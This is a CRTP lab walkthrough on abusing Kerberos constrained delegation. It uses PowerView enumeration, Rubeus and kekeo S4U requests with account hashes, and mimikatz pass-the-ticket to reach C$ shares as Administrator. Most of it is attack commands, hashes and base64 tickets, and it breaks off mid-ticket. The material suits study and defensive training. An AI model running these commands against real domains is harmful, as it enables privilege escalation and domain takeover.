# CRTP: Hands-On 16

```
• Enumerate users in the domain for whom Constrained Delegation is enabled.
  – For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
  – Pass the ticket and access the service as DA.
• Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
  – For such a user, request a TGT from the DC.
  – Use the TGS for executing the DCSync attack.
```

Index:

  1. [Constrained Delegation For users](#constrained-delegation-for-users)
  2. [Constrained Delegation For computers](#constrained-delegation-for-users)


## Constrained Delegation For users

Detect users with constrained delegation enable:

```
PS C:\Users\student162> Get-DomainUser -TrustedToAuth | select name, msds-allowedtodelegateto

name    msds-allowedtodelegateto
----    ------------------------
web svc {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
```

For detected user, impersonate the service with Rubus and access to the target service on dcorp-mssql such Domain Administrator:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF5jCCBeKgAwIBBaEDAgEWooIEvzCCBLthggS3MIIEs6ADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      BFswggRXoAMCARKhAwIBAqKCBEkEggRFewzw3v4s3vbovHXqswKbKTBvqcg7IW2f2HIUWX4m8EvBfRHj
      aQr6iONDPNlvTptYfNAcsmy2CrFrUTyC8wS37nw335/YDp0Z5DJ3/jd/OmEX7lnzIylOhdMcXy6hyJrd
      k/7ElytZKOqRB/A5zvTFsyGWuo+WEwVuACfe2MEfGrH/g/kDCm87iHhJvv6R1VSMikUWvfWcWElvFPnY
      hykKgTVDUIz2GOp7O8af7mZ8RmQirqd9HyUyTlpz0AEbYFaTu0VfxWrPlYGANBJwHS9ONNVff9bJ5uNA
      2rh7aH2QDiE4Ceg4ZylXq/W1iJIT8a6oh7JtXN8OEP3CH/MbGyUiBEBJOXc72INstv5SwIf8SFDgNA2N
      3jaICuqE6phxyiwc+WWK8xexQirP9XFWlBdd+iPDpysVAM+PuvVXJ8Al7P9CHFst6jNzdwiazQ/vV1kt
      VlChGEa6rgwuSUELRJy/oOoMu2zG8Iddb/sBveuWo0cI8rHH+RK8ms3rNXY+UKELEp/iSAj2OPyv4DYY
      4Q2wziv1VlLrH8sPVTMvg8CZAZ726+ZQ3bkS7DrkgbX37I3A8YukG8XPi0UyYoQ4OK/eCxqZ/xGSBiFy
      WZwIvxW9EKnjTJ+CQtduzFauR9VKqtvQG8DGLTzdZqwKpRclb5tyOqix2YGET4oBXzvPOP2yk3xzb44z
      1fhIxcpSrmTvWADSzJGbUWq4DMiGrCfRBkVrKXEHbeUFfo2ti3F3XyiOSkGROicZJBcekIMZgYK5qP8x
      d/5sbSx77oSi0MZ/AHer2xoeF2o6jc+4ghN/gBWyRKJ7XGvOiEi9th2SGD9lY1DGxYOfN8NyPV4VO3eN
      SyWlPxx97XDmN8OMSskfW8foTLCQwGmqCJgJz+Qg7YPtM5Eahg6mSTF1o6IzTknpiu21mXwgK5Eu/k/d
      qZqMwIh/hUJc79tKUhNncA8M5eYgv6JgSbFP/aAh8hmiTZ5zLaU54+a6PKQlwJ4lnlmjm5S/u57e9Glt
      8UH6vRqbTwdDw4wX5/yCdr905FjnOPmHb2Lkc+/Fit2xDIKN0JlFFUKNp13gzLSPLtLihmDu14KC/3h2
      ApC4NyVKPEAlyiuEMrTTPG8PpEoPEX1vbCC/xvp830b3WpDXPWbl7sbS8K9V/2dg2irVGUjNO3LH1057
      bhtGKrVKDlm+dwLLaXazzRhK3RHnLMMb4LXVtV02WV/CSaM3tGSkkKJTwPV/MKsvnmulIntTgLgjUd1d
      dU+k8PfUeIjxAEh3slJNhdrXT/bH2C11QLSu/5+0VrnosfsqL+iuBOvdWE0N5PzbgfC+YgTdPG7Q4uRN
      E7+38MQEQHeI/UvZcXyn2I4RB0Fe8l7/igxFrKWCGptSNKmqvG1OjR4CGGB7TROsWusHmPFi3VNGf0Mm
      Kx6LN0RkVOGFG3CKubJ2vq7iC9Fil5pmuo2gniLI2AuR3cD1iaOCAREwggENoAMCAQCiggEEBIIBAH2B
      /TCB+qCB9zCB9DCB8aArMCmgAwIBEqEiBCD1GfRBdNLdi5S8lFZ5HzUaqkUrW1+wwjlgvdpSUFU3zqEc
      GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBndlYnN2Y6MHAwUAQOEAAKUR
      GA8yMDIzMDUwMjE2NTk0M1qmERgPMjAyMzA1MDMwMjU5NDNapxEYDzIwMjMwNTA5MTY1OTQzWqgcGxpE
      T0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaZG9sbGFyY29ycC5t
      b25leWNvcnAubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGTDCCBkigAwIBBaEDAgEWooIFPjCCBTphggU2MIIFMqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMohMwEaADAgEBoQowCBsGd2Vic3Zjo4IE9jCCBPKgAwIBF6EDAgECooIE5ASCBOA2uHvc
      oG2p+GGdDGzeYRKpfgKgxDxt3e/6GMN1NVedSUqvNrZWQCLzXSg6liU3+YSQ8C0pLFYdQO1BgMMjoyNz
      /C/WxhlXEyhOHy7rBpoEO5kgRvUaDXW5J+y5H+OxYjsryhja1iAU5joaQiWOoJh6D4DY6sCde+sCraT2
      JQx8B88bJ+Y5F/YEG9Sm9KHPwSFiofjB3ynmB7/8ah3MZI7S4oF91autIs9tWeeuVQZzkeKd4Nl7eG0f
      FJIOM2qo3EJ39/awMpt5TiUvqwF7qdKvDq6RAA/B+MnVcaWk3LYQhWpER4J7CAOrLQAh24aP4EjRQFZD
      iXm8n9Fq77pt9SRTCvs+C5z4RTydO6zcMdrOp0ldXvJ//pgO8cda5S2NjgaABNbB7AF05hF486grHfgQ
      KaJH43yo8P3sF+NBEwO94pheRUTNtDGRnJrj4qZtQjM0hFQlCM1SxlJY391h2YYfSo1U+25V8SLdg5OW
      Q/a04p9azY1BzPlqSyxrZM1GMV3U5J9hUPTe1oJebi0cv2i3svZulgI/fmwQ8QnbORCyGMTsXWZcP9SU
      xUfHLf3kVc//ywwJF8FxoGvy3CuZRrHW/g/npZbNpNLupSUbjCF9NyR0l6cbUZJTUcHp7c3TFEAq1o5e
      Oc9bKGebLX9kI4Xur7g0HTWDlg4c8vtEu2bZBv6GZQRfnxnN9+1UAaDqLKRmJEqIV+NW9ETvPuTOZS3F
      k+n8W9NFxO5sL+bJ119RULozJvaeBaO6+8x6II4+0+QSUM+Ktb5sRFdtIO0hBiEuBuBHy0EjaR5b0Zc6
      pFwuNspMpHUblAnfWx+NdxBDhacYHlV4AwavHdUwIs8PT3LLRi6BLdUjA5sqBB2buH3hb18CpK8KljaI
      BVsLgx6HmotCOYrFMnbA5F22V/Jgdegm07itierun3JO0whO1aRADicuLl6JEy5QE22WZozdLr+OUOWG
      /MPcwj8PPPQb01FY95N6e+DuNCmWJJY+4gVFVXQWPcUO+PMUbYJ0sA2VgoHAZ5MMFThL4nFoInMLiVDd
      +ALtAnHBOxhUPp6rQOBpN74u5kjQ3apleQBQCe2ZnRHenFthHLNc4LLbCIy1bUzhMiFOS1pN5XxPp5YS
      esOFQAxSJ0kE52RtZzMRaGFUeMVF3HiNfT8NPPlf+AKjaxcULBSm2Dob/m2AU5WLX7p8ZGJBwu9fiCnl
      zPGYY3aSWHe9Ai+fJ+lUcglGonJ4VpzVRxSq9TQK4O1Xj2ReLIof3UiufBJ4CCLlUfxhQuVa4xFpwKmh
      K8fnLeZxDLqzh7njZvd6XPqiqGd+vhCw1pS92veQYAP/r3I/wNxB8KJx3OIYmEuS0bYxurNn7pJjSaX1
      QJuKfwLOh3WA+dg0tPA/S6CAJ2l/KvgF7Zpa/3TivQ+biAaQSXdM5bUxXRwBOz4+tLtECP340cxx2VUc
      IS8E1dbnoUAX7KSdqDYJ9pBgybVImWn2vkqP0ygj4+aF8OicneaxpmiKGsOfoBopoOAED8f1kMP+zjDK
      v6WN69E4iQgXPuOWSsW3SpelDiV7IUhKoua0QQgxsPYagE+iui4zgf8Iv6iL//3IIa716SHKQld7ZfOd
      Q13Vzoaa8Us766mCjjbiMDH7DR3shJiPzQix/o1oOS2S7MNo8+6UePgC9GKjgfkwgfagAwIBAKKB7gSB
      632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCCAvVuVtNHZm5EoMkeUKwpjNEUg3/uWElNSozrV2TLh
      26EcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAEChAAClERgPMjAyMzA1MDIxNjU5NDNaphEYDzIwMjMwNTAzMDI1OTQzWqcRGA8yMDIzMDUwOTE2
      NTk0M1qoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypEzARoAMCAQGhCjAIGwZ3ZWJzdmM=

[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

      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
[+] Ticket successfully imported!

```

CIFS, only allow access to the filesystem:

```
C:\Windows\system32>dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
 Volume Serial Number is 76D3-EB93

 Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$

05/08/2021  01:15 AM    <DIR>          PerfLogs
11/14/2022  05:44 AM    <DIR>          Program Files
11/14/2022  05:43 AM    <DIR>          Program Files (x86)
03/03/2023  06:39 AM    <DIR>          Transcripts
11/15/2022  02:48 AM    <DIR>          Users
11/11/2022  06:22 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   6,237,990,912 bytes free

```

The same technique with kekeo, i've been never used it beafore:

```
>.\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Jun 15 2018 01:01:01 - lil!
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with  9 modules * * */
```

Obtaing tgt:

```
kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
Realm        : dollarcorp.moneycorp.local (dollarcorp)
User         : websvc (websvc)
CName        : websvc   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/dollarcorp.moneycorp.local        [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): cc098f204c5887eaa8253e7c2749156f
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi'


```

Use tgt for rquest s4u tgs:

```
kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
Ticket  : TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
  [krb-cred]     S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: websvc @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] S: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
  [enc-krb-cred] T: [5/2/2023 10:07:47 AM ; 5/2/2023 8:07:47 PM] {R:5/9/2023 10:07:47 AM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 044f2888af2ad834cec622a2eefdfb42d3f949ac66cc780ea396f4020ed26a1c
  [s4u2self]  Administrator@dollarcorp.moneycorp.local
[kdc] name: dcorp-dc.dollarcorp.moneycorp.local (auto)
[kdc] addr: 172.16.2.1 (auto)
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_websvc@DOLLARCORP.MONEYCORP.LOCAL.kirbi'
Service(s):
  [s4u2proxy] CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL
  > Ticket in file 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_CIFS~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi'

kekeo # exit
Bye!
```

Use extracted kirbi ticket:

```
Invoke-Mimi -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_CIFS~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_CIFS~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_CIFS~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK

PS C:\AD\Tools\kekeo\x64> ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:15 AM                PerfLogs
d-r---        11/14/2022   4:44 AM                Program Files
d-----        11/14/2022   4:43 AM                Program Files (x86)
d-----          3/3/2023   5:39 AM                Transcripts
d-r---        11/15/2022   1:48 AM                Users
d-----        11/11/2022   5:22 AM                Windows

```

## Constrained Delegation For computers

```
 Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

name           msds-allowedtodelegateto
----           ------------------------
DCORP-ADMINSRV {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}


```

With ALtservice HTTP for remote access:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:HTTP /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGazCCBmegAwIBBaEDAgEWooIFODCCBTRhggUwMIIFLKADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      BNQwggTQoAMCARKhAwIBAqKCBMIEggS+64MGLk2w8Eq/w9Eg8W5UX5nMegHYOJRjmkSBeRAYTI4XP0Ny
      dG42mcU6xnWBBoJIR2JB1NrlXUu+90sryeI9/jMMweaUi5wWTnjzjetgGUp16NmByF9oVJk+PerKlZ+B
      hUd4v+0i1GsnvfezK89TsWnY15TmWnQXDgruzV2fZZ5bFK13hrEVLiptEqrirsNzgWFpPAGX22jeTeOM
      TB9YK3y271WEy87wXXiH6/9fpUNM7bgZDctQUEJyKviM2p8nT2P6VU+J3bVxyib4h1GguiA0HRKGzirB
      2tFLLFIZBbKKAiYb0jU22WMx2jCTT/ovB8Csj+qMQIXmA/ZIKaSwhjX1wnazL8BFJbUshCi06hsJwY2e
      WUQMdxXVgInSSJ/Gv7jYzlqDM1xOV583A3JM2cxHR/WYTO+6OFLIKRVsdQCxBB/5u8anEjGlZaAKLdvT
      FjXKosMp9Mk5xtBQx836sJJ5/E/fdaMeaBO74Dvke9Bfgja9WSRWEgN79plXNlmO4J4B1KlcmUNVBUB/
      mLxVTPz4Y8hRBGiyg+8iTYc7TWCDaBr0hpQc/dK44h7dmPxRfemdRUUTsA8dmCI5ZzZCc22AeyjmDL35
      xt4C8VVgWM9oBxJ/XYY8MSrK5oemNYRnLSHmD8FdnzEwie0310kuUfOIDMhwtXdLTxCc6QnMcAKGyL7j
      UGxWVst733TOcKfK4QUO3ckxp+tBhh73btUmVdsXU/d1eeSx/kxXdL5ITD1M6nP/jzuygNGeVamVwScq
      H+j4RGGI181Gmcw1PR/FSRgiPH3jDpCD9zt+v95tHOjzonZS2Bxeil3S9guO727h2ygPpx2jr3UmGdn9
      N2V+Psy4h9759uQijznBUnSS+8jTKRMfz4JQ845cXl6cgNlscmVCp5HG1ZKvrSMQ8lnpQsDAOLwgPuJb
      3oBd3pfBLr5nXr1XMqE7geevI+LKeOF0XXSxqif7EUqKtNYKXbr1hS3cBD/e7s/6naTIvlulVdp8lImw
      ZtJ+W1HVO2r6Kn2DQcBGhJs+u5FU8r8Wtc4rCZj0S1fdaB1WG8O80Wp2weuA498un2jf1g+skjKeXejx
      RfX1e9CYeraq09HQtXMAzdCFzNmuWnvKehlham2DXRKr+Og+qruvhgPhM5eX7syOhfcVu4Pk+rrOsikp
      mhOjw9ckv2cXK4M8hK0EvYgV75ECmNM/VHQjHI7tf+cIr6X4T83a9OM485ZyDKSrsAxVxnh5/XgFiIIL
      v9vbs+nRy3vJh/n3NRj2BchodEv/1uZoLzBuuvw468uNXFWx6+RcbJ/RPXNb6zQjzd6r9Jyb1pTnwDPI
      5Kj7X8yJaVDKswYBaI2vH8DkRNgLJw4EkoNIyvPv5uMurR8wVez1KALh4WUMoSdYbfc/NP4S0FQ6EYol
      lhD6JrcomivUtn+HWgAXxW618BaJ+ePQLTf5DxH2dAf04hj5v+qnWMi1z/U0ZHe0Xv/k2JIz7UVuN7Xk
      mohKIu85fZ0PesbvM358eJi2HToCprxHoSenLeOiFf995fEXUngWjji3X0I1/pLfHov0CfFXSIFSSX0e
      PrEzJ9MABCfXBp9LYkdTZimtZwLDV9wTTP1dbOGdNp2jxpDoGdOjggEdMIIBGaADAgEAooIBEASCAQx9
      ggEIMIIBBKCCAQAwgf0wgfqgKzApoAMCARKhIgQgLxlO2wbSZ224697EWQ0GuZ79/cr0vyrrK2fzyhAx
      +LOhHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiHDAaoAMCAQGhEzARGw9kY29ycC1hZG1pbnNy
      diSjBwMFAEDhAAClERgPMjAyMzA1MDIxNzIzMjhaphEYDzIwMjMwNTAzMDMyMzI4WqcRGA8yMDIzMDUw
      OTE3MjMyOFqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMCAQKhJjAkGwZrcmJ0Z3Qb
      GmRvbGxhcmNvcnAubW9uZXljb3JwLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGWzCCBlegAwIBBaEDAgEWooIFQzCCBT9hggU7MIIFN6ADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMohwwGqADAgEBoRMwERsPZGNvcnAtYWRtaW5zcnYko4IE8jCCBO6gAwIBEqEDAgEBooIE
      4ASCBNwSgTY0E1r5N1D535ENN1eP8CY9zOsqkhMXBRZqWTZoaWvUs1BX8b/+rVlw5LE+mLjRs/BP7/vb
      gBKo93gI39U591EJj1Stf/QlWlLacw+4e7kbuzAheu8yDEx+M0GvuVZS7ZHwlGo1asz15BIvfRCEAUnJ
      FezHt61CE3VlP93yqS3tXviiaChcJ90QQ5NyvozOQSgofDRn6+upho2fHUt7rqlDhqW5KWCLtOPDjspW
      fcK7iyMJLrlxhLcoG9v8BttHYZTPIFxWFw15w9UJj8dGA1/C4tir/E1KXduBBgqHZqVrbGvfhT+C0EiW
      5jJ7I9mXQhPasJboSGoirvxWTUc8QDFhQXFJEEsq7VpHeZBBfELBEaDfkzswXKK4XxoI7H8P4MSB8hJ4
      hQn6zJRpqQ/WtsWS8+0/OKwjRlQrmh2Ea82+oC0EwfzF4VsmeyobPoAqR/HqlIGeRQSZTWzLFn3Heyrg
      4SwD1MUHAkZjxmbPBe3c+sI/Gl92LCmAGMgimkpnX5Ae6kL3aR+WEp+dL07bxui84FgrruXVc868SGs0
      DeJsrpc+8e+tRCTF7IU1m1PsMDUno3cPxHsvUQ2zXMLleOCi+tOw4BpPcTc9ZJSN+aoAc3L2SL/sRlN3
      lpxlw0u6jOmzOFYkCzV8ZUhozL4xLix1EguHWZ6DPBeyJykNX1I3yvbtSaKEGBDVbiI0G+SvVM9Roemz
      SlUKQ+axIeq7rS6MFzfWas2AFtAa6Yr7CY0L9FaU6F0NSnllloJeZNdW5ca3vlr4bfnZ8QYdjJBqmlcK
      IS7qURJCMSsRESc1VLF/pU835dk6jvrb6zHnZ9icBSZSxm1ElewMIM5UKJplJ2qlaaPIwktSAXAhwx9B
      euuXSj4chcFvUeSuO7Xnhn9a1prqDP5aiTbwuBX4/4XwtNIreCmhNLbIBJshWVHOOFJerceQbs4amsfs
      hZuGg3obTD4O0a5PkqXAdIs8xzI6KACfqj8TzSemo1IUnW+mKrI3CYA4Jl1mS4X1iDZycWLjlHCHyo8X
      wyD2KV21iGeTgsxL5KES+vWnYmA5g/sfKhrGVOPCnoPhimjTdEbdnexk2B+7yw9o/8olLHHg9wKHYK5V
      hWJtXPtY8cOhsszKFpjAaDr9YsXPPm/klLvcwWfqpJu1UA7o8XzOUPA6q+SI+xtkXF0yB344QNXC1dQs
